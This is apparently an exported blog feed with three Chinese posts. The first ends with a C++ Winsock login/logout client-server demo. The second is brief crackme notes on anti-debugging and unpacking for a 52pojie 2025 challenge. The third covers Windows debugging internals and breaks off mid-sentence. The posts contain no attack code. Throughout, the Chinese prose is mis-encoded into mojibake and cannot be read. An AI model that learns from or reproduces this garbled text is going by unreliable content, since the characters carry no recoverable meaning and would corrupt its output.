class="type">char</span>*)&amp;login + <span class="built_in">sizeof</span>(Header),</span><br><span class="line"><span class="built_in">sizeof</span>(Login) - <span class="built_in">sizeof</span>(Header), <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (recvRes2 &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;recv error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">LoginResult <span class="title">loginResult</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">send</span>(clientSock, (<span class="type">char</span>*)&amp;loginResult, <span class="built_in">sizeof</span>(LoginResult), <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;send error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> CMD::LOGOUT:</span><br><span class="line">&#123;</span><br><span class="line">Logout logout;</span><br><span class="line"><span class="type">int</span> recvRes2 = <span class="built_in">recv</span>(clientSock, (<span class="type">char</span>*)&amp;logout + <span class="built_in">sizeof</span>(Header),</span><br><span class="line"><span class="built_in">sizeof</span>(Logout) - <span class="built_in">sizeof</span>(Header), <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (recvRes2 &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;recv error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">LogoutResult <span class="title">logoutResult</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">send</span>(clientSock, (<span class="type">char</span>*)&amp;logoutResult, <span class="built_in">sizeof</span>(LoginResult), <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;send error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> CMD::LOGIN_RESULT:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CMD::LOGOUT_RESULT:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//bool Server::conductMsg() &#123;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Server server;</span><br><span class="line"><span class="keyword">if</span> (!server.<span class="built_in">init</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">2345</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">server.<span class="built_in">start</span>();</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//message.hpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">CMD</span></span><br><span class="line">&#123;</span><br><span class="line">LOGIN,</span><br><span class="line">LOGOUT,</span><br><span class="line">LOGIN_RESULT,</span><br><span class="line">LOGOUT_RESULT,</span><br><span class="line">NO_CMD</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Header</span></span><br><span class="line">&#123;</span><br><span class="line">CMD cmd;</span><br><span class="line"><span class="type">unsigned</span> dataLength;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Header</span>() : <span class="built_in">cmd</span>(CMD::NO_CMD)</span><br><span class="line">, <span class="built_in">dataLength</span>(<span class="number">0</span>) &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Header</span>(CMD cmd_, <span class="type">unsigned</span> dataLength_) : <span class="built_in">cmd</span>(cmd_)</span><br><span class="line">, <span class="built_in">dataLength</span>(dataLength_) &#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Login</span> :<span class="keyword">public</span> Header</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> usrName[<span class="number">32</span>];</span><br><span class="line"><span class="type">char</span> passwd[<span class="number">32</span>];</span><br><span class="line"><span class="built_in">Login</span>(<span class="type">const</span> <span class="type">char</span>* userName_, <span class="type">const</span> <span class="type">char</span>* passwd_) :<span class="built_in">Header</span>(CMD::LOGIN, <span class="built_in">sizeof</span>(Login))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">strcpy_s</span>(usrName, <span class="number">32</span>, userName_);</span><br><span class="line"><span class="built_in">strcpy_s</span>(passwd, <span class="number">32</span>, passwd_);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Login</span>() :<span class="built_in">Header</span>(CMD::LOGIN, <span class="built_in">sizeof</span>(Login)), usrName&#123; <span class="number">0</span> &#125;, passwd&#123; <span class="number">0</span> &#125; &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Logout</span> : <span class="keyword">public</span> Header</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> logoutNum;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Logout</span>(<span class="type">unsigned</span> logoutNum_) : <span class="built_in">Header</span>(CMD::LOGOUT, <span class="built_in">sizeof</span>(Logout))</span><br><span class="line">, <span class="built_in">logoutNum</span>(logoutNum_) &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Logout</span>() :<span class="built_in">Header</span>(CMD::LOGOUT, <span class="built_in">sizeof</span>(Logout)), <span class="built_in">logoutNum</span>(<span class="number">0</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">LoginResult</span> :<span class="keyword">public</span> Header</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> loginResultNum;</span><br><span class="line"><span class="built_in">LoginResult</span>(<span class="type">unsigned</span> loginResultNum_) :<span class="built_in">Header</span>(CMD::LOGIN_RESULT, <span class="built_in">sizeof</span>(LoginResult)), <span class="built_in">loginResultNum</span>(loginResultNum_) &#123;&#125;</span><br><span class="line"><span class="built_in">LoginResult</span>() :<span class="built_in">Header</span>(CMD::LOGIN_RESULT, <span class="built_in">sizeof</span>(LoginResult)), <span class="built_in">loginResultNum</span>(<span class="number">0</span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">LogoutResult</span> :<span class="keyword">public</span> Header</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> logoutResultNum;</span><br><span class="line"><span class="built_in">LogoutResult</span>(<span class="type">unsigned</span> logoutResultNum_) :<span class="built_in">Header</span>(CMD::LOGOUT_RESULT, <span class="built_in">sizeof</span>(LogoutResult)), <span class="built_in">logoutResultNum</span>(logoutResultNum_) &#123;&#125;</span><br><span class="line"><span class="built_in">LogoutResult</span>() :<span class="built_in">Header</span>(CMD::LOGOUT_RESULT, <span class="built_in">sizeof</span>(LogoutResult)), <span class="built_in">logoutResultNum</span>(<span class="number">0</span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WS2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Message.hpp&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">WSADATA data&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;data) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;WSAstartup error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">SOCKET servSock = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"><span class="keyword">if</span> (servSock == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;socket error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">sockaddr_in servAddr&#123;&#125;;</span><br><span class="line">servAddr.sin_family = AF_INET;</span><br><span class="line">servAddr.sin_port = <span class="built_in">htons</span>(<span class="number">2345</span>);</span><br><span class="line"><span class="built_in">inet_pton</span>(AF_INET, <span class="string">&quot;127.0.0.1&quot;</span>, &amp;servAddr.sin_addr.S_un.S_addr);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">connect</span>(servSock, (sockaddr*)&amp;servAddr, <span class="built_in">sizeof</span>(sockaddr)) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;connect error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">closesocket</span>(servSock);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;connect success&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="function">Login <span class="title">login</span><span class="params">(<span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;bbbb&quot;</span>)</span></span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">send</span>(servSock, <span class="built_in">reinterpret_cast</span>&lt;<span class="type">char</span>*&gt;(&amp;login), <span class="built_in">sizeof</span>(Login), <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;send error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">LoginResult loginResult;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">recv</span>(servSock, <span class="built_in">reinterpret_cast</span>&lt;<span class="type">char</span>*&gt;(&amp;loginResult), <span class="built_in">sizeof</span>(LoginResult), <span class="number">0</span>) &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;recv error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; loginResult.loginResultNum &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> å¼€å‘ </category>
          
          <category> è¯­è¨€å­¦ä¹  </category>
          
          <category> ç½‘ç»œç¼–ç¨‹ </category>
          
          <category> CPP </category>
          
          <category> ç½‘ç»œç¼–ç¨‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> ç½‘ç»œ </tag>
            
            <tag> cs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¾çˆ±2025è§£é¢˜é¢†çº¢åŒ…5windowsé«˜çº§é¢˜ç®€è¦åˆ†æ</title>
      <link href="/posts/43ad3f3c.html"/>
      <url>/posts/43ad3f3c.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€</h2><p>è¿™ä¸ªé¢˜å¾ˆæœ‰æ„æ€<br>ä½†æ˜¯ç¬¬ä¸€å…³å°±å¡äº†æˆ‘å¾ˆä¹…<br>è¿™é‡Œè®°å½•ä¸€ä¸‹æˆ‘æ˜¯æ€ä¹ˆåˆ†æçš„</p><h2 id="å£³">å£³</h2><p>è¿™ä¸ªå£³çš„åè°ƒè¯•éƒ¨åˆ†åœ¨TlsCallback_0å‡½æ•°çš„ç¬¬äºŒæ¬¡call raxä¸­<br>7FF708E27DB0è¿™ä¸ªå‡½æ•°,é€šè¿‡7FF708E26280åˆ¤æ–­æ˜¯å¦æœ‰è°ƒè¯•å’Œ7FF708E244A0åˆ¤æ–­æ˜¯å¦æœ‰hook,ç„¶åè·å¾—ä¸€ä¸ªæ ‡å¿—ä½æ”¾åˆ°flag_aä¸­</p><p><img src="https://s2.loli.net/2025/02/16/WV1t7PzX5OiGBDK.png" alt="image-20250216210356149"></p><p>åœ¨jmp raxä¸­è·³è½¬åˆ°7FF708E24400æ‰§è¡ŒsetThreadInfomationå‡½æ•°çš„ä½ç½®,ä¼ å‚æ˜¯-(flag_a != 1) ^ 0x11<br>å¦‚æœæ ‡å¿—ä½ä¸º1è¯´æ˜æ˜¯è°ƒè¯•,ä¼šç›´æ¥è§¦å‘hidefromdebugæ•ˆæœ,å¦‚æœæ ‡å¿—ä¸º2åˆ™ä¼šä¼ å…¥é”™è¯¯çš„setInfomatinonå€¼,æœ€åä¼šä¼ å‡º0xC000003å¯¼è‡´æ˜¾ç¤ºç¯å¢ƒå¼‚å¸¸.å¦‚æœæ ‡å¿—ä¸º5,è¡¨æ˜æ­£å¸¸ä¸ä¼šè¿›è¡Œæ£€æŸ¥.</p><p>ç¬¬äºŒç‚¹,è¿™é‡Œè°ƒè¯•çš„æ—¶å€™å¦‚æœå¯¹åé¢SMCè§£å¯†çš„ä»£ç ä¸‹äº†æ–­ç‚¹0xcc,åˆ™ä¼šå¯¼è‡´å®ƒè¿˜åŸå¤±è´¥,æ‰€ä»¥è¿™é‡Œæ˜¯ä¸èƒ½æå‰ä¸‹æ–­ç‚¹çš„</p><h2 id="è„±å£³">è„±å£³</h2><p>å°†ç¨‹åºçš„åŠ¨æ€åŸºå€å…³æ‰ï¼Œç„¶åæ¥åˆ°jmpä¹‹åçš„ä½ç½®ã€‚ç”¨xdbgè„±å£³ï¼ŒIATè¡¨æ²¡æœ‰è¿˜åŸï¼Œæ‰€ä»¥ä¸èƒ½è¿è¡Œï¼Œä½†æ˜¯è¿™æ ·å¯ä»¥ç›´æ¥çœ‹åˆ°åŠ å¯†æµç¨‹äº†</p><p>å°±æ˜¯ä¸€ä¸ªTEA</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>win-è°ƒè¯•åŸç†</title>
      <link href="/posts/6e648a52.html"/>
      <url>/posts/6e648a52.html</url>
      
        <content type="html"><![CDATA[<h2 id="X86çš„ä¸»è¦è°ƒè¯•è®¾æ–½">X86çš„ä¸»è¦è°ƒè¯•è®¾æ–½</h2><p>INT 3 æŒ‡ä»¤   è½¯ä»¶æ–­ç‚¹åŸºç¡€<br>è¿½è¸ªæ ‡å¿—TF   å•æ­¥è¿½è¸ªçš„åŸºç¡€<br>è°ƒè¯•å¯„å­˜å™¨   ç¡¬ä»¶å¯„å­˜å™¨çš„åŸºç¡€<br>åˆ†æ”¯ç›‘è§†å’Œè®°å½•   æŒ‰åˆ†æ”¯å•æ­¥çš„åŸºç¡€</p><h2 id="è½¯ä»¶æ–­ç‚¹">è½¯ä»¶æ–­ç‚¹</h2><p>0xCC int3æŒ‡ä»¤<br>æœºå™¨ç ä¸º1å­—èŠ‚ï¼Œæ— æ•°é‡é™åˆ¶ï¼Œåªæ”¯æŒä»£ç æ®µ(å¯æ‰§è¡Œçš„æ®µ)ï¼Œä¸”ä¸æ”¯æŒåœ¨åªè¯»å­˜å‚¨å™¨ä¸­ä½¿ç”¨</p><p>å°†ä¸€ä¸ªint 3 å†™å…¥ï¼Œè§¦å‘å¼‚å¸¸breakä¹‹åä¼šè¢«æ¢å¤ï¼Œå†æ‰§è¡Œåä¼šå†æ¬¡å†™å…¥</p><h2 id="ç¡¬ä»¶æ–­ç‚¹">ç¡¬ä»¶æ–­ç‚¹</h2><p>é€šè¿‡è°ƒè¯•å¯„å­˜å™¨å®ç°ï¼ŒDR0åˆ°DR3 çš„å››ä¸ªå¯„å­˜å™¨ä¸­å­˜æ”¾ç›®æ ‡åœ°å€<br>DR7æœ‰8ç»„è®¾ç½®æ ‡å¿—ä½ï¼Œæ¯ç»„åˆ†åˆ«æœ‰2ä¸ª2ä½æ ‡å¿—ï¼Œå…¶ä¸­ä¸€ä¸ªæ ‡å¿—è¡¨ç¤ºR/Wï¼Œå¦ä¸€ä¸ªæ ‡å¿—è¡¨ç¤ºé•¿åº¦<br>CPUæ¯æ‰§è¡Œ1æ­¥å°±è¿›è¡Œä¸€æ¬¡åŒ¹é…ï¼Œå¦‚æœæ˜¯è¿™ä¸ªåœ°å€ï¼Œæ¨¡å¼æ­£ç¡®ï¼Œå°±ä¼šå†™å…¥DR6çš„æ ‡å¿—ä½ï¼Œç„¶åè§¦å‘æ–­ç‚¹(äº§ç”Ÿ1å·å¼‚å¸¸)ï¼Œæ“ä½œç³»ç»Ÿé€šè¿‡æ£€æŸ¥æ ‡å¿—ä½çŸ¥é“å“ªä¸€ä¸ªå‘½ä¸­äº†æ–­ç‚¹</p><p>ç”±äºæ¯ä¸ªçº¿ç¨‹çš„å¯„å­˜å™¨ä¿¡æ¯ç‹¬ç«‹ä¿å­˜ï¼Œæ‰€ä»¥æ¯ä¸ªçº¿ç¨‹éƒ½å¯ä»¥è®¾4ä¸ªåœ°å€</p><h2 id="é™·é˜±æ ‡å¿—">é™·é˜±æ ‡å¿—</h2><p>æ ‡å¿—å¯„å­˜å™¨efl(ag)çš„TFä½<br>å•æ­¥å¼‚å¸¸åœ¨eflçš„æœ€ä½ä½ã€‚æ¯å½“eflæœ€åä¸€ä½æ˜¯1ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨ç½®0ï¼Œç„¶åè§¦å‘å•æ­¥å¼‚å¸¸</p><h2 id="å¼‚å¸¸">å¼‚å¸¸</h2><p>å‰é¢å‡ èŠ‚å·²ç»å·®ä¸å¤šè¯´æ˜äº†ï¼Œè¿™é‡Œå°±ä¸èµ˜è¿°äº†ã€‚ä¸è¿‡åœ¨ç¨‹åºä¸­ï¼Œå°¤å…¶æ˜¯VSç”Ÿæˆçš„ä»£ç ï¼Œä¸€èˆ¬æ¥è¯´ä½çº§çš„å¼‚å¸¸å¾€å¾€ä¼šå°è£…æˆCxxå¼‚å¸¸ã€‚</p><h3 id="ä¸­æ–­å‘é‡è¡¨">ä¸­æ–­å‘é‡è¡¨</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">0 </span>é™¤é›¶å¼‚å¸¸</span><br><span class="line"><span class="symbol">1 </span>è°ƒè¯•å¼‚å¸¸</span><br><span class="line"><span class="symbol">3 </span>æ–­ç‚¹å¼‚å¸¸</span><br><span class="line"><span class="symbol">4 </span>æº¢å‡ºå¼‚å¸¸</span><br><span class="line"><span class="symbol">5 </span>æ•°ç»„è¶Šç•Œå¼‚å¸¸</span><br><span class="line"><span class="symbol">6 </span>éæ³•æŒ‡ä»¤å¼‚å¸¸</span><br><span class="line"><span class="symbol">13 </span>ä¿æŠ¤å¼‚å¸¸</span><br><span class="line"><span class="symbol">14 </span>ç¼ºé¡µå¼‚å¸¸</span><br><span class="line"><span class="symbol">18 </span>æœºå™¨æ£€æŸ¥å¼‚å¸¸</span><br><span class="line"><span class="number">32</span>-<span class="number">255</span> ç”¨æˆ·è‡ªå®šä¹‰ï¼Œå¾ˆå¤šæ˜¯ä¸­æ–­ï¼Œè€Œä¸æ˜¯å¼‚å¸¸</span><br></pre></td></tr></table></figure><h3 id="æ¥æº">æ¥æº</h3><p>CPUäº§ç”Ÿ æ‰§è¡ŒæŒ‡ä»¤æ£€æµ‹åˆ°çš„é”™è¯¯ï¼Œæœºå™¨å¼‚å¸¸ï¼Œè°ƒè¯•å¼‚å¸¸ç­‰<br>ç¨‹åºäº§ç”Ÿï¼ŒRaiseException win32api<br>C++ throw E</p><h2 id="JTAG">JTAG</h2><p>ç¡¬ä»¶è°ƒè¯•æ ‡å‡†</p><h2 id="ç”¨æˆ·æ€è°ƒè¯•æ¨¡å‹XP">ç”¨æˆ·æ€è°ƒè¯•æ¨¡å‹XP</h2><p>æ–­ç‚¹å‘½ä¸­æ—¶ï¼ŒCPUç«‹å³åˆ‡æ¢åˆ°å†…æ ¸æ‰§è¡Œä¸€ç³»åˆ—å¼‚å¸¸å¤„ç†å‡½æ•°ã€‚å…¶ä¸­KISystemServiceè°ƒç”¨KiRaiseException()äº§ç”Ÿå¼‚å¸¸KiDebugServiceå’ŒKiTrap04~00åšåˆ†å‘å‡†å¤‡ã€‚KiDispatchException()æ˜¯åˆ†å‘ä¸­æ¢ï¼Œä¼šé€šçŸ¥ç”¨æˆ·æ€è°ƒè¯•å­ç³»ç»ŸDbgkï¼Œç„¶åè§¦å‘DbgkForwardExcption()ï¼Œå¦‚æœæœ‰è°ƒè¯•å™¨æ‰§è¡ŒDbgkpSendApiMessages()ç»§ç»­ä¼ é€’ï¼Œåˆ°DbgkQueueMessage()ç”Ÿæˆè°ƒè¯•äº‹ä»¶å¹¶å°†äº§ç”Ÿçš„è°ƒè¯•å¯¹è±¡æŒ‚åˆ°å†…æ ¸è°ƒè¯•å¯¹è±¡é˜Ÿåˆ—ä¸­ã€‚è°ƒè¯•å™¨ä¸€ç›´ç­‰å¾…è¿™ä¸ªé˜Ÿåˆ—ï¼Œæœ‰è°ƒè¯•å¯¹è±¡æ—¶å°±ä¼šå–å‡ºå¹¶å¤„ç†ã€‚</p><h3 id="è°ƒè¯•å™¨çš„è½½å…¥ç¨‹åº">è°ƒè¯•å™¨çš„è½½å…¥ç¨‹åº</h3><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¼šåœ¨ç›®æ ‡è¿›ç¨‹åˆ›å»ºä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œint 3ï¼Œä½†æ˜¯ç³»ç»Ÿåœ¨åˆ†å‘å¼‚å¸¸æ—¶ä¼šå†»ç»“æ‰€æœ‰çº¿ç¨‹</p><h2 id="KiDisPatchException">KiDisPatchException</h2><p>ç”¨æˆ·æ€å¼‚å¸¸å†…å«2è½®å¼‚å¸¸åˆ†å‘ï¼š<br>ç¬¬ä¸€è½®ï¼š</p><p>å¦‚æœæ²¡æœ‰ç”¨æˆ·æ€è°ƒè¯•å™¨ï¼Œå°è¯•åˆ†å‘ç»™å†…æ ¸è°ƒè¯•å™¨<br>DbgkForwardExceptionå°è¯•äº¤ç»™ç”¨æˆ·æ€è°ƒè¯•å™¨<br>å¤åˆ¶æ ˆå¸§ç„¶åæ”¹ç¨‹åºæŒ‡é’ˆåˆ°KeUserExceptionDispatcheråˆ°ç”¨æˆ·æ€</p><p>ç¬¬äºŒè½®ï¼š</p><p>DbgkForwardExceptionå°è¯•äº¤ç»™ç”¨æˆ·æ€è°ƒè¯•å™¨<br>ç„¶åå°è¯•äº¤ç»™æœåŠ¡è¿›ç¨‹ï¼Œè®©æœåŠ¡è¿›ç¨‹åšæœ€åå¤„ç†ï¼Œä¸€èˆ¬ç›´æ¥æ€æ­»<br>å¦‚æœè¿˜æ˜¯ä¸å¤„ç†ï¼Œç›´æ¥è°ƒç”¨ZwTerminateProcessåœ¨å†…æ ¸æ€æ€æ­»</p><blockquote><p>äº§ç”Ÿç¡¬ä»¶å¼‚å¸¸é€šè¿‡ IDTè°ƒç”¨å¼‚å¸¸å¤„ç†ä¾‹ç¨‹ï¼Œ äº§ç”Ÿè½¯ä»¶å¼‚å¸¸é€šè¿‡ APIçš„å±‚å±‚è°ƒç”¨äº§åœ°å¼‚å¸¸ä¿¡æ¯ã€‚è€Œå¼‚å¸¸åˆç”±äºå‘ç”Ÿä½ç½®ä¸åŒï¼Œåˆ†ä¸ºå†…æ ¸å¼‚å¸¸å’Œç”¨æˆ·æ€å¼‚å¸¸ï¼ŒäºŒè€…æœ€åéƒ½ä¼šé  